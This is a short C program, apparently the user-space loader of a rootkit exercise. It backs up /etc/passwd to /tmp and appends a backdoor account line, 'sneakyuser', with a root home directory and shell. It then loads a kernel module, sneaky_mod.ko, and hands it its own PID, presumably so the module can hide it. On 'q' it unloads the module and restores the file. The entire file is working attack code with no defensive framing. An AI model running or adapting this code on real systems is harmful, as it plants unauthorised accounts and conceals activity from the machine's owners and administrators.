#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void add_content(char *addLine){
    FILE *addConetent = fopen(addLine, "a+");
    if(addConetent==NULL){
        perror("Cannot open the /etc/passwd file\n");
        exit(EXIT_FAILURE);
    }
    fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n", addConetent);
    fclose(addConetent);
}

int main(){
    printf("sneaky_process pid = %d\n", getpid());
    
    //copy the content from one file to another
    FILE * origin;
    if((origin =fopen("/etc/passwd", "r"))==NULL){
        perror("Cannot open the origin file\n");
        exit(EXIT_FAILURE);
    }

    FILE * temp;
    if((temp=fopen("/tmp/passwd", "w"))==NULL){
        perror("Cannot open the temp file\n");
        exit(EXIT_FAILURE);
    }

    char c;
    while((c=fgetc(origin))!=EOF){
        fputc(c, temp);
    }
    fclose(origin);
    fclose(temp);

    add_content("/etc/passwd");
   
    char buff[200];
    sprintf(buff, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(buff);
    char ch;
    while ((ch = getchar()) != 'q'){}
    system("rmmod sneaky_mod.ko");
    system("cp /tmp/passwd /etc/passwd");
    system("rm /tmp/passwd");
}
